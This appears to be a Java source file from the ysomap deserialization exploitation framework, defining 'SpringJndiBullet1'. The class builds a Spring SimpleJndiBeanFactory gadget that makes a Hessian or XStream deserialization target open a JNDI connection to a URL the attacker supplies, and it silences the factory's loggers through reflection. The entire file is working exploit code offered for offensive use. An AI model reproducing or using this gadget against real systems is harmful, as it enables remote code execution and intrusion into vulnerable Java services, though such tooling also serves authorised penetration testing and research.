package ysomap.bullets.spring;

import org.apache.commons.logging.impl.NoOpLog;
import org.springframework.jndi.support.SimpleJndiBeanFactory;
import ysomap.bullets.AbstractBullet;
import ysomap.common.annotation.*;
import ysomap.core.util.ReflectionHelper;

/**
 * @author wh1t3P1g
 * @since 2020/6/6
 */
@Bullets
@Authors({Authors.WH1T3P1G})
@Details("向外发起JNDI连接")
@Targets({Targets.HESSIAN, Targets.XSTREAM})
@Dependencies({"org.springframework:spring-context"})
public class SpringJndiBullet1 extends AbstractBullet<Object> {

    @NotNull
    @Require(name = "jndiURL", detail = "向外发起JNDI连接")
    public String jndiURL;

    private String beanName;

    @Override
    public Object getObject() throws Exception {
        SimpleJndiBeanFactory bf = new SimpleJndiBeanFactory();
        bf.setShareableResources(jndiURL);
        beanName = jndiURL;
        ReflectionHelper.setFieldValue(bf, "logger", new NoOpLog());
        ReflectionHelper.setFieldValue(bf.getJndiTemplate(), "logger", new NoOpLog());
        return bf;
    }

    public static SpringJndiBullet1 newInstance(Object... args) throws Exception {
        SpringJndiBullet1 bullet = new SpringJndiBullet1();
        bullet.set("jndiURL", args[0]);
        return bullet;
    }
}
